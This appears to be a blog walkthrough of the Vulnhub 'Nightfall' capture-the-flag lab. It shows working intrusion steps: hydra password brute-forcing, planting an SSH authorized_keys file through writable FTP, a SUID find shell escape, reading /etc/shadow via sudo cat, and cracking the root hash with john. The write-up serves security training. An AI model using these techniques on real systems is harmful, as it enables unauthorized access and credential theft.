---
title: "Vulnhub: Nightfall"
layout: archive
date:   2021-01-05
tags: Vulnhub
tags_label: true
---
This is a beginner-level machine part of the sunset series from vulnhub. I would definitely recommend it, it will expose you to some essential skills/concepts

### Scanning:

Begin by finding the machine on the network:

```
crazyeights@es-base:~$ nmap -PS 192.168.0.1-255

Nmap scan report for 192.168.0.203
Host is up (0.00012s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
```

Find more details about running services. Only other important detail found was the domain name `nightfall`

```
crazyeights@es-base:~$ sudo nmap -sCSV 192.168.0.203
[SNIP]
```

### Web:

Nothing on the web server, just the default page.

### SMB:

List available shares:

```
crazyeights@es-base:~$ smbclient -L \\nightfall -I 192.168.0.203 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

There are no available shares, using enum4linux to find users:

```
enum4linux 192.168.0.203
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
```

*   we find two local users nightfall, and matt
    
*   Try to get the password for a user for another of the running services:
    

```
crazyeights@es-base:~$ hydra -l matt -P lists/rockyou-40.txt ftp://192.168.0.203
[SNIP]
[DATA] attacking ftp://192.168.0.203:21/
[21][ftp] host: 192.168.0.203   login: matt   password: cheese
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-05 17:48:17
crazyeights@es-base:~$ 
```

### FTP:

Login as matt:

```
crazyeights@es-base:~$ ftp 192.168.0.203
Connected to 192.168.0.203.
220 pyftpdlib 1.5.5 ready.
Name (192.168.0.203:crazyeights): matt
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Look for available files:

```
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rw-------   1 matt     matt            0 Aug 28  2019 .bash_history
-rw-r--r--   1 matt     matt          220 Aug 26  2019 .bash_logout
-rw-r--r--   1 matt     matt         3526 Aug 26  2019 .bashrc
drwx------   3 matt     matt         4096 Aug 28  2019 .gnupg
drwxr-xr-x   3 matt     matt         4096 Aug 26  2019 .local
-rw-r--r--   1 matt     matt          807 Aug 26  2019 .profile
-rw-------   1 matt     matt            0 Aug 28  2019 .sh_history
226 Transfer complete.
```

*   There is no interesting information in any of the files
*   The ftp servier is writable though

Create a folder .ssh to add our public key as an authorized key allowing for us to login via SSH:

```
ftp> mkdir .ssh
257 "/.ssh" directory created.
ftp> cd .ssh
250 "/.ssh" is the current directory.
ftp> dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp>
```

*   create a public-private key pair with `ssh-keygen` if you do not have one already
*   Copy your public key to file authorized keys:

```
crazyeights@es-base:~$ cp .ssh/id_rsa.pub authorized_keys
```

Upload the file authorized_keys to the folder .ssh on the ftp server:

```
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
573 bytes sent in 0.01 secs (63.6961 kB/s)
ftp> 
```

### User:

We can now login as matt via SSH:

```
crazyeights@es-base:~$ ssh matt@192.168.0.203
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

matt@nightfall:~$ 
```

There are only two users on the machine matt and nightfall:

```
matt@nightfall:~$ ls /home
matt  nightfall
```

Find programs matt can run acting as a different user:

```
matt@nightfall:~$ find / -perm /4000 2>/dev/null
/scripts/find
```

The binary scripts/find seems promising:

```
matt@nightfall:/scripts$ ls
find
```

Testing running it we determine it is the same as normal find:

```
matt@nightfall:/scripts$ ./find / -name "index.html"
```

Like with normal find we can use the exec param to get a shell:

Getting the user flag:

```
matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ cd /home/nightfall
$ ls
user.txt
$ cat user.txt
97fb7140ca325ed96f67be3c9e30083d
```

### Root:

To elevate our privileges to that of the user nightfall we can copy the authorized\_keys we made earlier to `nightfall/.ssh/authorized_keys` allowing us to login to SSH as nightfall:

```
matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \; -quit
$ id            
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)
$ mkdir /home/nightfall/.ssh
$ cp /home/matt/.ssh/authorized_keys /home/nightfall/.ssh/authorized_keys
$ 
```

Logging in as nightfall:

```
crazyeights@es-base:~$ ssh nightfall@192.168.0.203
Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64

Last login: Wed Aug 28 18:35:04 2019 from 192.168.1.182
nightfall@nightfall:~$ ls
user.txt
```

Find what programs the user nightfall can run with elevated privileges:

```
nightfall@nightfall:~$ sudo -l
Matching Defaults entries for nightfall on nightfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
```

*   The user nightfall can run cat as root, meaning we can read all files as root
*   Reading the shadow file to retrieve passwords:

```
nightfall@nightfall:/tmp$ sudo cat /etc/shadow
root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7:::
```

Copy the hash to a file and crack it using john:

```
crazyeights@es-base:~$ john --wordlist=lists/rockyou-40.txt -rules nightfall_root_pass 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
miguel2          (root)
1g 0:00:00:06 DONE (2021-01-05 20:07) 0.1587g/s 4876p/s 4876c/s 4876C/s IUBITA..mariajose2
Use the "--show" option to display all of the cracked passwords reliably
Session completed
crazyeights@es-base:~$ 
```

Login as root:

```
nightfall@nightfall:/tmp$ su root
Password: 
```

Retrieve the root flag:

```
root@nightfall:~# cat root_super_secret_flag.txt 
Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1
[SNIP]
Thank you for playing! - Felipe Winsnes (whitecr0wz)                                 

flag{9a5b21fc6719fe33004d66b703d70a39}

root@nightfall:~#
```

FIN.